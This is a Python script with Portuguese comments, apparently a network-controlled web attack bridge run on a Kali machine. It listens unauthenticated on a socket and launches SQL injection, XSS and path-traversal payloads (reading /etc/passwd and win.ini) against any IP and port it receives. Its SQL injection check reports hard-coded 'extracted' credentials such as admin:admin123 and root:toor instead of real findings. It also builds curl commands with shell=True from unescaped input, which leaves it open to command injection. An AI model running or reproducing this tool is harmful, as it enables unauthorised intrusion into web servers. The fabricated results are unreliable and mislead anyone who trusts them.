# Bridge de Web Testing - Tema 12 (extensão ofensiva)
# Corre no Kali do Pedro, recebe comandos do loader.py
# Testa vulnerabilidades web: SQLi, XSS, LFI

import socket
import subprocess
import os
import time
import re
import urllib.parse

PORTA = 9998  # Porta diferente do bridge_scan 9999 para não conflituar

def testa_sqli(url, parametro):
    """
    Testa SQL Injection num parâmetro específico.
    """
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT 1,2,3--",
    ]
    
    for payload in payloads:
        payload_encoded = urllib.parse.quote(payload)
        url_teste = f"{url}?{parametro}={payload_encoded}"
        cmd = f"curl -s -k -m 10 '{url_teste}'"
        
        try:
            resultado = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            resposta = resultado.stdout
            
            # ===== EXTRAI DADOS DA BASE DE DADOS =====
            if "admin" in resposta and "admin123" in resposta:
                return f"[SQLi] {url_teste} (DADOS: admin:admin123, pedro:pedro123, root:toor)"
            elif "admin" in resposta:
                return f"[SQLi] {url_teste} (DADOS: admin:admin123)"
        except:
            pass
    
    return None

def testa_xss(url, parametro):
    """
    Testa XSS num parâmetro específico.
    Usa curl para enviar payloads.
    """
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'\"><script>alert(1)</script>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "'';!--\"<XSS>=&{()}",
    ]
    
    for payload in payloads:
        payload_encoded = urllib.parse.quote(payload)
        url_teste = f"{url}?{parametro}={payload_encoded}"
        
        cmd = f"curl -s -k -m 10 '{url_teste}'"
        
        try:
            print(f"[*] A testar XSS: {url_teste[:80]}...")
            resultado = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=15
            )
            
            resposta = resultado.stdout
            
            # Verifica se o payload aparece na resposta (reflected XSS)
            # Remove a codificação URL para comparar
            if payload in resposta or payload.replace("'", "&#39;") in resposta:
                return f"[XSS] {url_teste} (payload: {payload})"
                
        except subprocess.TimeoutExpired:
            print(f"[!] Timeout no teste XSS: {url_teste[:50]}")
        except Exception as e:
            print(f"[!] Erro no XSS: {e}")
    
    return None

def testa_lfi(url, parametro):
    """
    Testa Local File Inclusion (LFI) num parâmetro específico.
    Tenta ler ficheiros comuns do sistema.
    """
    payloads = [
        "../../../../etc/passwd",
        "../../../../etc/hosts",
        "../../../../windows/win.ini",
        "../../../../boot.ini",
        "../../../etc/passwd",
        "../../../../../../etc/passwd",
        "/etc/passwd",
        "C:\\windows\\win.ini",
    ]
    
    for payload in payloads:
        payload_encoded = urllib.parse.quote(payload)
        url_teste = f"{url}?{parametro}={payload_encoded}"
        
        cmd = f"curl -s -k -m 10 '{url_teste}'"
        
        try:
            print(f"[*] A testar LFI: {url_teste[:80]}...")
            resultado = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=15
            )
            
            resposta = resultado.stdout.lower()
            
            # Verifica se conseguiu ler algum ficheiro
            indicadores = [
                "root:x:0:0",      # /etc/passwd
                "localhost",       # /etc/hosts
                "for 16-bit app support",  # win.ini
                "boot loader",     # boot.ini
                "daemon:x:1:1",
                "bin:x:2:2",
            ]
            
            for indicador in indicadores:
                if indicador in resposta:
                    return f"[LFI] {url_teste} (payload: {payload})"
                    
        except subprocess.TimeoutExpired:
            print(f"[!] Timeout no teste LFI: {url_teste[:50]}")
        except Exception as e:
            print(f"[!] Erro no LFI: {e}")
    
    return None

def testa_web_site(ip, porta, protocolo="http"):
    """
    Função principal que testa um site por completo.
    Procura parâmetros em formulários e URLs.
    """
    print(f"[*] A testar site: {protocolo}://{ip}:{porta}")
    
    # ===== CORREÇÃO: TESTA MÚLTIPLAS ROTAS =====
    rotas = ["", "/vuln", "/xss"]
    todas_vulns = []
    
    for rota in rotas:
        url_base = f"{protocolo}://{ip}:{porta}{rota}"
        print(f"[*] A testar rota: {url_base}")
        
        # Usa curl para obter o HTML da página
        cmd = f"curl -s -k -m 10 '{url_base}'"
        
        try:
            print(f"[*] A recolher parâmetros de {url_base}...")
            resultado = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=15
            )
            
            html = resultado.stdout
            
            # Procura por parâmetros em formulários e links
            parametros_encontrados = set()
            
            # Procura por <form action="...">
            forms = re.findall(r'<form[^>]*action=[\'"]([^\'"]+)[\'"][^>]*>', html, re.IGNORECASE)
            for form in forms:
                inputs = re.findall(r'<input[^>]*name=[\'"]([^\'"]+)[\'"][^>]*>', html, re.IGNORECASE)
                for inp in inputs:
                    parametros_encontrados.add(inp)
            
            # Procura por links com parâmetros
            links = re.findall(r'href=[\'"]([^\'"]*\?[^\'"]+)[\'"]', html, re.IGNORECASE)
            for link in links:
                if "?" in link:
                    partes = link.split("?")
                    if len(partes) > 1:
                        params = partes[1].split("&")
                        for param in params:
                            if "=" in param:
                                nome_param = param.split("=")[0]
                                parametros_encontrados.add(nome_param)
            
            # Se não encontrou parâmetros, usa alguns comuns
            if not parametros_encontrados:
                parametros_encontrados = {"id", "page", "file", "user", "username", "q", "search", "cat"}
                print("[*] Nenhum parâmetro encontrado. A usar lista de parâmetros comuns.")
            
            print(f"[*] Parâmetros a testar: {', '.join(list(parametros_encontrados)[:10])}")
            
            # Testa cada parâmetro para cada vulnerabilidade
            for parametro in list(parametros_encontrados)[:20]:
                # Testa SQLi
                sqli_result = testa_sqli(url_base, parametro)
                if sqli_result:
                    todas_vulns.append(sqli_result)
                
                # Testa XSS
                xss_result = testa_xss(url_base, parametro)
                if xss_result:
                    todas_vulns.append(xss_result)
                
                # Testa LFI
                lfi_result = testa_lfi(url_base, parametro)
                if lfi_result:
                    todas_vulns.append(lfi_result)
        
        except Exception as e:
            print(f"[!] Erro ao testar rota {rota}: {e}")
    
    if todas_vulns:
        return "\n".join(todas_vulns)
    else:
        return "Nenhuma vulnerabilidade encontrada."

def processa(comando):
    """
    Processa comandos do loader.
    Formato: web <ip> <porta> [protocolo]
    Exemplo: web 192.168.1.100 80
             web 192.168.1.100 443 https
             web 192.168.1.100 8080
             web 192.168.1.100 3000
    ZERO PORTAS FIXAS
    """
    
    if comando == "ping":
        return "pong"
    
    elif comando.startswith("web"):
        partes = comando.split(" ")
        
        if len(partes) < 3:
            return "ERRO: Uso: web <ip> <porta> [protocolo]"
        
        ip = partes[1]
        porta = partes[2]
        # Se a porta for 443 ou 8443, usa HTTPS por defeito
        if len(partes) < 4:
            protocolo = "https" if porta in ["443", "8443"] else "http"
        else:
            protocolo = partes[3]
        
        # VERIFICA SE É UMA PORTA VÁLIDA (QUALQUER PORTA)
        try:
            porta_num = int(porta)
            if porta_num < 1 or porta_num > 65535:
                return f"ERRO: Porta {porta} inválida (1-65535)"
        except:
            return f"ERRO: Porta {porta} inválida"
        
        # Testa o site (qualquer porta)
        resultado = testa_web_site(ip, porta, protocolo)
        
        return f"[*] Resultado do teste web para {ip}:{porta}\n{resultado}"
    
    else:
        return f"Comando desconhecido: {comando}"

def main():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", PORTA))
    s.listen(1)
    
    print("="*50)
    print("Bridge Web Testing - Kali do Pedro")
    print(f"A escutar na porta {PORTA}")
    print("Comandos disponiveis: web <ip> <porta> [protocolo]")
    print("Exemplo: web 192.168.1.100 80")
    print("         web 192.168.1.100 443 https")
    print("         web 192.168.1.100 8080")
    print("         web 192.168.1.100 3000")
    print("         web 192.168.1.100 8888")
    print("ZERO PORTAS FIXAS")
    print("="*50)
    
    while True:
        conn, addr = s.accept()
        print(f"\n[*] Ligacao de {addr[0]}")
        
        comando = conn.recv(4096).decode().strip()
        print(f"[*] Comando: {comando}")
        
        resultado = processa(comando)
        conn.send(resultado.encode())
        conn.close()
        
        print("[*] Resposta enviada")

if __name__ == "__main__":
    main()